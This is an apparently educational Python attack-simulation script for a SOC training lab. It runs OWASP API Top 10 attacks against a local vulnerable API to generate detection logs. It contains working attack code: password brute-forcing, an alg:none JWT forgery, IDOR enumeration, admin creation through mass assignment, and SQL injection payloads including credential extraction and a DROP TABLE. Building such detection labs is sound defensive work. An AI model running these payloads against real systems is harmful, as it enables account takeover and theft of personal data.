#!/usr/bin/env python3
"""
Scenario 22: API Vulnerability Exploitation - Attack Simulation.

Tests all OWASP API Security Top 10 issues:
- API1: Broken Object Level Authorization (BOLA/IDOR)
- API2: Broken Authentication (JWT bypass, weak secret)
- API3: Excessive Data Exposure
- API4: Lack of Resources & Rate Limiting
- API5: Broken Function Level Authorization
- API6: Mass Assignment
- API8: Injection (SQL injection)

Generates realistic attack traffic and logs for SOC detection.
"""

import json
import os
import sys
import time

import requests
from colorama import Fore, Style, init

# Add project root to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", ".."))

from wcace_lib.log_generator import LogGenerator
from wcace_lib.siem_client import SIEMClient
from wcace_lib.constants import ATTACKER_IP, API_SERVER_IP, API_PORT

init(autoreset=True)

TARGET_URL = os.environ.get("TARGET_URL", f"http://localhost:{API_PORT}")
LOG_DIR = os.path.join(os.path.dirname(__file__), "..", "logs", "sample_logs")


def banner():
    print(f"""
{Fore.RED}{'='*62}
  WCACE Scenario 22: API Vulnerability Exploitation
  Target: {TARGET_URL}
  OWASP API Security Top 10 Attack Simulation
  WARNING: Educational use only
{'='*62}{Style.RESET_ALL}
""")


# ==================================================================
# Phase 1: Reconnaissance
# ==================================================================

def phase_1_recon(session: requests.Session, log_gen: LogGenerator) -> list[str]:
    """Phase 1: Enumerate API endpoints and discover attack surface."""
    print(f"{Fore.YELLOW}[Phase 1] API Reconnaissance - Endpoint Discovery{Style.RESET_ALL}")
    logs = []

    endpoints = [
        "/api",
        "/api/health",
        "/api/auth/login",
        "/api/auth/register",
        "/api/users/1",
        "/api/admin/users",
        "/api/data?query=test",
        "/api/keys",
        "/api/docs",          # Common endpoint to probe
        "/api/swagger.json",  # OpenAPI spec probe
    ]

    for ep in endpoints:
        try:
            resp = session.get(f"{TARGET_URL}{ep}", timeout=5)
            status = resp.status_code
            marker = "  [+]" if status < 400 else "  [-]"
            print(f"{marker} {ep} -> {status}")
            logs.append(log_gen.web_access_log(ATTACKER_IP, "GET", ep, status))
        except requests.exceptions.RequestException as e:
            print(f"  [-] {ep} -> ERROR: {e}")

    return logs


# ==================================================================
# Phase 2: Broken Authentication (API2)
# ==================================================================

def phase_2_broken_auth(session: requests.Session, log_gen: LogGenerator) -> tuple[list[str], str]:
    """Phase 2: Exploit broken authentication -- JWT bypass and weak credentials."""
    print(f"\n{Fore.YELLOW}[Phase 2] Broken Authentication (OWASP API2){Style.RESET_ALL}")
    logs = []
    valid_token = ""

    # 2a: Brute-force with no rate limiting (also tests API4)
    print(f"  {Fore.CYAN}[2a] Credential brute-force (no rate limiting)...{Style.RESET_ALL}")
    passwords = ["admin", "password", "123456", "admin123", "letmein",
                 "password123", "admin123!", "root", "test"]

    for pwd in passwords:
        try:
            resp = session.post(f"{TARGET_URL}/api/auth/login",
                                json={"username": "admin", "password": pwd},
                                timeout=5)
            data = resp.json()
            if data.get("status") == "success":
                valid_token = data["token"]
                print(f"  {Fore.RED}[!] BRUTE FORCE SUCCESS: admin / {pwd}")
                print(f"      Token: {valid_token[:50]}...{Style.RESET_ALL}")
                # Check for excessive data exposure
                user_data = data.get("user", {})
                if user_data.get("ssn"):
                    print(f"  {Fore.RED}[!] EXCESSIVE DATA: SSN exposed: {user_data['ssn']}{Style.RESET_ALL}")
                if user_data.get("api_key"):
                    print(f"  {Fore.RED}[!] EXCESSIVE DATA: API key exposed: {user_data['api_key']}{Style.RESET_ALL}")
                break
            else:
                print(f"  [-] admin / {pwd} -> {data.get('error', 'failed')}")
        except requests.exceptions.RequestException:
            pass

        logs.append(log_gen.web_access_log(
            ATTACKER_IP, "POST", "/api/auth/login", 401,
            user_agent="python-requests/api-fuzzer"
        ))
        logs.append(log_gen.ids_alert(
            ATTACKER_IP, API_SERVER_IP,
            "API Brute Force: Login attempt",
            sid=9220001, severity=2
        ))

    # 2b: JWT algorithm confusion (alg:none bypass)
    print(f"\n  {Fore.CYAN}[2b] JWT algorithm confusion attack...{Style.RESET_ALL}")
    try:
        import base64
        # Craft a JWT with "alg":"none"
        header = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).rstrip(b"=").decode()
        payload = base64.urlsafe_b64encode(
            json.dumps({
                "user_id": 1, "username": "admin", "role": "admin",
                "iat": int(time.time()), "exp": int(time.time()) + 3600,
            }).encode()
        ).rstrip(b"=").decode()
        forged_jwt = f"{header}.{payload}."

        resp = session.get(
            f"{TARGET_URL}/api/users/1",
            headers={"Authorization": f"Bearer {forged_jwt}"},
            timeout=5
        )
        if resp.status_code == 200:
            print(f"  {Fore.RED}[!] JWT ALG:NONE BYPASS SUCCESS!")
            print(f"      Accessed admin profile without valid signature{Style.RESET_ALL}")
            if not valid_token:
                valid_token = forged_jwt
        else:
            print(f"  [-] JWT alg:none bypass -> {resp.status_code}")

        logs.append(log_gen.web_access_log(
            ATTACKER_IP, "GET", "/api/users/1", resp.status_code,
            user_agent="jwt-cracker/1.0"
        ))
        logs.append(log_gen.ids_alert(
            ATTACKER_IP, API_SERVER_IP,
            "API Attack: JWT algorithm manipulation (alg:none)",
            sid=9220002, severity=1
        ))
    except Exception as e:
        print(f"  [-] JWT bypass error: {e}")

    # 2c: Username enumeration
    print(f"\n  {Fore.CYAN}[2c] Username enumeration...{Style.RESET_ALL}")
    usernames = ["admin", "root", "john.doe", "nonexistent_user", "svc_api"]
    for uname in usernames:
        try:
            resp = session.post(f"{TARGET_URL}/api/auth/login",
                                json={"username": uname, "password": "wrong"},
                                timeout=5)
            data = resp.json()
            exists = data.get("username_exists", "unknown")
            print(f"  [*] {uname:25s} -> exists={exists}")
            logs.append(log_gen.web_access_log(
                ATTACKER_IP, "POST", "/api/auth/login", resp.status_code
            ))
        except requests.exceptions.RequestException:
            pass

    # Fall back: get a valid token the normal way for subsequent phases
    if not valid_token:
        try:
            resp = session.post(f"{TARGET_URL}/api/auth/login",
                                json={"username": "john.doe", "password": "password123"},
                                timeout=5)
            data = resp.json()
            if data.get("token"):
                valid_token = data["token"]
                print(f"\n  [*] Obtained valid token as john.doe for further testing")
        except requests.exceptions.RequestException:
            pass

    return logs, valid_token


# ==================================================================
# Phase 3: BOLA / IDOR (API1)
# ==================================================================

def phase_3_idor(session: requests.Session, log_gen: LogGenerator,
                 token: str) -> list[str]:
    """Phase 3: Exploit Broken Object Level Authorization (IDOR)."""
    print(f"\n{Fore.YELLOW}[Phase 3] Broken Object Level Authorization - IDOR (OWASP API1){Style.RESET_ALL}")
    logs = []

    if not token:
        print(f"  {Fore.RED}[-] No valid token, skipping IDOR tests{Style.RESET_ALL}")
        return logs

    headers = {"Authorization": f"Bearer {token}"}

    # Iterate through user IDs to access other users' data
    for uid in range(1, 6):
        try:
            resp = session.get(f"{TARGET_URL}/api/users/{uid}",
                               headers=headers, timeout=5)
            if resp.status_code == 200:
                user_data = resp.json().get("user", {})
                print(f"  {Fore.RED}[!] IDOR: Accessed user {uid} - "
                      f"{user_data.get('username', '?')} "
                      f"(role={user_data.get('role', '?')}, "
                      f"SSN={user_data.get('ssn', '?')}){Style.RESET_ALL}")
            else:
                print(f"  [-] User {uid} -> {resp.status_code}")

            logs.append(log_gen.web_access_log(
                ATTACKER_IP, "GET", f"/api/users/{uid}", resp.status_code,
                user_agent="python-requests/api-fuzzer"
            ))
            logs.append(log_gen.ids_alert(
                ATTACKER_IP, API_SERVER_IP,
                f"API IDOR: Sequential user ID enumeration (id={uid})",
                sid=9220003, severity=1
            ))
        except requests.exceptions.RequestException:
            pass
        time.sleep(0.2)

    return logs


# ==================================================================
# Phase 4: Excessive Data Exposure (API3)
# ==================================================================

def phase_4_excessive_exposure(session: requests.Session, log_gen: LogGenerator,
                                token: str) -> list[str]:
    """Phase 4: Exploit excessive data exposure."""
    print(f"\n{Fore.YELLOW}[Phase 4] Excessive Data Exposure (OWASP API3){Style.RESET_ALL}")
    logs = []

    if not token:
        print(f"  [-] No valid token, skipping")
        return logs

    headers = {"Authorization": f"Bearer {token}"}

    # Access API keys endpoint (returns all users' keys)
    try:
        resp = session.get(f"{TARGET_URL}/api/keys", headers=headers, timeout=5)
        if resp.status_code == 200:
            keys_data = resp.json().get("keys", [])
            print(f"  {Fore.RED}[!] EXCESSIVE DATA: Got {len(keys_data)} API keys:{Style.RESET_ALL}")
            for k in keys_data:
                print(f"      -> user_id={k.get('user_id')} "
                      f"key={k.get('key_value')} "
                      f"scope={k.get('scope')}")
        logs.append(log_gen.web_access_log(
            ATTACKER_IP, "GET", "/api/keys", resp.status_code
        ))
        logs.append(log_gen.ids_alert(
            ATTACKER_IP, API_SERVER_IP,
            "API Excessive Data Exposure: All API keys returned",
            sid=9220004, severity=1
        ))
    except requests.exceptions.RequestException:
        pass

    return logs


# ==================================================================
# Phase 5: Broken Function Level Authorization (API5)
# ==================================================================

def phase_5_function_auth(session: requests.Session, log_gen: LogGenerator,
                           token: str) -> list[str]:
    """Phase 5: Access admin endpoints without admin role."""
    print(f"\n{Fore.YELLOW}[Phase 5] Broken Function Level Authorization (OWASP API5){Style.RESET_ALL}")
    logs = []

    if not token:
        print(f"  [-] No valid token, skipping")
        return logs

    headers = {"Authorization": f"Bearer {token}"}

    # Access admin endpoint with non-admin token
    try:
        resp = session.get(f"{TARGET_URL}/api/admin/users",
                           headers=headers, timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            total = data.get("total", 0)
            print(f"  {Fore.RED}[!] ADMIN BYPASS: Accessed /api/admin/users as non-admin!")
            print(f"      Retrieved {total} user records with sensitive data{Style.RESET_ALL}")
            for u in data.get("users", [])[:3]:
                print(f"      -> {u.get('username'):15s} role={u.get('role'):8s} "
                      f"salary=${u.get('salary', 0):,.2f}")
        else:
            print(f"  [-] /api/admin/users -> {resp.status_code}")

        logs.append(log_gen.web_access_log(
            ATTACKER_IP, "GET", "/api/admin/users", resp.status_code
        ))
        logs.append(log_gen.ids_alert(
            ATTACKER_IP, API_SERVER_IP,
            "API Auth Bypass: Non-admin accessed admin endpoint",
            sid=9220005, severity=1
        ))
    except requests.exceptions.RequestException:
        pass

    return logs


# ==================================================================
# Phase 6: Mass Assignment (API6)
# ==================================================================

def phase_6_mass_assignment(session: requests.Session, log_gen: LogGenerator) -> tuple[list[str], str]:
    """Phase 6: Exploit mass assignment to create admin user."""
    print(f"\n{Fore.YELLOW}[Phase 6] Mass Assignment (OWASP API6){Style.RESET_ALL}")
    logs = []
    new_token = ""

    # Register a new user with role=admin
    try:
        payload = {
            "username": f"attacker_{int(time.time())}",
            "password": "hacked123",
            "email": "attacker@evil.test",
            "full_name": "Evil Attacker",
            "role": "admin",       # MASS ASSIGNMENT: inject admin role
        }
        resp = session.post(f"{TARGET_URL}/api/auth/register",
                            json=payload, timeout=5)
        data = resp.json()

        if resp.status_code == 201 and data.get("status") == "success":
            msg = data.get("message", "")
            print(f"  {Fore.RED}[!] MASS ASSIGNMENT: {msg}")
            print(f"      Created admin account: {payload['username']}{Style.RESET_ALL}")
            new_token = data.get("token", "")
        else:
            print(f"  [-] Registration -> {resp.status_code}: {data}")

        logs.append(log_gen.web_access_log(
            ATTACKER_IP, "POST", "/api/auth/register", resp.status_code,
            user_agent="python-requests/api-fuzzer"
        ))
        logs.append(log_gen.ids_alert(
            ATTACKER_IP, API_SERVER_IP,
            "API Mass Assignment: User registered with elevated role",
            sid=9220006, severity=1
        ))
    except requests.exceptions.RequestException as e:
        print(f"  [-] Registration error: {e}")

    # Also try updating existing user's role via PUT
    if new_token:
        headers = {"Authorization": f"Bearer {new_token}"}
        try:
            resp = session.put(f"{TARGET_URL}/api/users/2",
                               headers=headers,
                               json={"role": "admin", "salary": 999999.99},
                               timeout=5)
            if resp.status_code == 200:
                print(f"  {Fore.RED}[!] MASS ASSIGNMENT: Escalated user 2 to admin "
                      f"with salary $999,999.99{Style.RESET_ALL}")
            logs.append(log_gen.web_access_log(
                ATTACKER_IP, "PUT", "/api/users/2", resp.status_code
            ))
        except requests.exceptions.RequestException:
            pass

    return logs, new_token


# ==================================================================
# Phase 7: SQL Injection (API8)
# ==================================================================

def phase_7_sqli(session: requests.Session, log_gen: LogGenerator,
                 token: str) -> list[str]:
    """Phase 7: SQL injection in data query endpoint."""
    print(f"\n{Fore.YELLOW}[Phase 7] SQL Injection (OWASP API8){Style.RESET_ALL}")
    logs = []

    if not token:
        print(f"  [-] No valid token, skipping")
        return logs

    headers = {"Authorization": f"Bearer {token}"}

    sqli_payloads = [
        # Error-based probing
        ("'", "Error-based probe"),
        ("' OR '1'='1", "Boolean-based blind"),
        # UNION extraction
        ("' UNION SELECT 1,2,3,4,5,6,7--", "UNION column count"),
        ("' UNION SELECT id,username,password_hash,email,role,ssn,salary FROM users--",
         "UNION extract users"),
        # Table enumeration
        ("' UNION SELECT 1,name,type,sql,1,1,1 FROM sqlite_master--",
         "Schema extraction"),
        # Destructive (logged only)
        ("'; DROP TABLE audit_log;--", "Destructive payload"),
    ]

    for payload, description in sqli_payloads:
        try:
            resp = session.get(
                f"{TARGET_URL}/api/data",
                headers=headers,
                params={"query": payload, "table": "financial_data"},
                timeout=5
            )
            data = resp.json()

            if resp.status_code == 200:
                count = data.get("count", 0)
                if count > 0:
                    print(f"  {Fore.RED}[!] SQLi ({description}): "
                          f"Extracted {count} records{Style.RESET_ALL}")
                    for r in data.get("results", [])[:2]:
                        print(f"      -> {dict(r)}")
                else:
                    print(f"  [*] SQLi ({description}): 200 OK, 0 results")
            elif resp.status_code == 500:
                error = data.get("error", "")
                sql_shown = data.get("sql", "")
                print(f"  {Fore.RED}[!] SQLi ({description}): SQL error exposed!")
                if sql_shown:
                    print(f"      SQL: {sql_shown[:80]}{Style.RESET_ALL}")
            else:
                print(f"  [-] SQLi ({description}): {resp.status_code}")

            logs.append(log_gen.web_access_log(
                ATTACKER_IP, "GET",
                f"/api/data?query={payload[:50]}", resp.status_code,
                user_agent="sqlmap/1.7"
            ))
            logs.append(log_gen.ids_alert(
                ATTACKER_IP, API_SERVER_IP,
                f"API SQL Injection: {description}",
                sid=9220007, severity=1
            ))
        except requests.exceptions.RequestException:
            pass
        time.sleep(0.3)

    return logs


# ==================================================================
# Phase 8: Rate Limiting Abuse (API4)
# ==================================================================

def phase_8_rate_limiting(session: requests.Session, log_gen: LogGenerator) -> list[str]:
    """Phase 8: Demonstrate lack of rate limiting."""
    print(f"\n{Fore.YELLOW}[Phase 8] Lack of Resources & Rate Limiting (OWASP API4){Style.RESET_ALL}")
    logs = []

    # Rapid-fire login attempts
    print(f"  [*] Sending 50 rapid login attempts...")
    success_count = 0
    start = time.time()

    for i in range(50):
        try:
            resp = session.post(
                f"{TARGET_URL}/api/auth/login",
                json={"username": "admin", "password": f"attempt_{i}"},
                timeout=3
            )
            if resp.status_code != 429:  # No rate limiting returns 429
                success_count += 1
        except requests.exceptions.RequestException:
            break

    elapsed = time.time() - start

    if success_count == 50:
        print(f"  {Fore.RED}[!] NO RATE LIMITING: All 50 requests accepted "
              f"in {elapsed:.1f}s ({50/elapsed:.0f} req/s){Style.RESET_ALL}")
    else:
        print(f"  [*] {success_count}/50 requests accepted in {elapsed:.1f}s")

    logs.append(log_gen.ids_alert(
        ATTACKER_IP, API_SERVER_IP,
        f"API Rate Limit Abuse: {success_count} rapid requests in {elapsed:.1f}s",
        sid=9220008, severity=2
    ))

    # Generate bulk log entries for the brute-force
    for i in range(50):
        logs.append(log_gen.web_access_log(
            ATTACKER_IP, "POST", "/api/auth/login", 401
        ))

    return logs


# ==================================================================
# Main
# ==================================================================

def main():
    banner()

    # Check if target is reachable
    session = requests.Session()
    session.headers.update({"Content-Type": "application/json"})

    try:
        resp = session.get(f"{TARGET_URL}/api/health", timeout=5)
        print(f"{Fore.GREEN}[*] Target reachable: {TARGET_URL}{Style.RESET_ALL}\n")
    except requests.exceptions.RequestException:
        print(f"{Fore.RED}[!] Target unreachable. Start the vuln API first:")
        print(f"    python3 attack/vuln_api.py{Style.RESET_ALL}")
        print(f"\n[*] Generating sample logs in offline mode...\n")

    log_gen = LogGenerator(source_host="attacker-kali")
    all_logs = []

    # Execute attack phases
    recon_logs = phase_1_recon(session, log_gen)
    all_logs.extend(recon_logs)

    auth_logs, token = phase_2_broken_auth(session, log_gen)
    all_logs.extend(auth_logs)

    idor_logs = phase_3_idor(session, log_gen, token)
    all_logs.extend(idor_logs)

    exposure_logs = phase_4_excessive_exposure(session, log_gen, token)
    all_logs.extend(exposure_logs)

    func_auth_logs = phase_5_function_auth(session, log_gen, token)
    all_logs.extend(func_auth_logs)

    mass_logs, new_token = phase_6_mass_assignment(session, log_gen)
    all_logs.extend(mass_logs)

    sqli_logs = phase_7_sqli(session, log_gen, token or new_token)
    all_logs.extend(sqli_logs)

    rate_logs = phase_8_rate_limiting(session, log_gen)
    all_logs.extend(rate_logs)

    # Save logs
    os.makedirs(LOG_DIR, exist_ok=True)
    log_file = os.path.join(LOG_DIR, "api_attack.jsonl")
    SIEMClient.write_logs_to_file(all_logs, log_file)

    # Summary
    print(f"\n{Fore.GREEN}{'='*62}")
    print(f"  API Attack Simulation Complete")
    print(f"{'='*62}{Style.RESET_ALL}")
    print(f"  Total log entries: {len(all_logs)}")
    print(f"  Log file: {log_file}")
    print(f"\n  OWASP API Top 10 Coverage:")
    print(f"    API1  Broken Object Level Auth (IDOR)     - TESTED")
    print(f"    API2  Broken Authentication               - TESTED")
    print(f"    API3  Excessive Data Exposure              - TESTED")
    print(f"    API4  Lack of Resources & Rate Limiting    - TESTED")
    print(f"    API5  Broken Function Level Auth           - TESTED")
    print(f"    API6  Mass Assignment                      - TESTED")
    print(f"    API8  Injection (SQLi)                     - TESTED")

    # Try to send to Loki if available
    try:
        siem = SIEMClient()
        siem.loki_push_lines(
            {"job": "attack_sim", "scenario": "22-api-vuln"},
            all_logs
        )
        print(f"\n  [*] Logs pushed to Loki")
    except Exception:
        print(f"\n  [*] Loki not available - logs saved locally only")


if __name__ == "__main__":
    main()
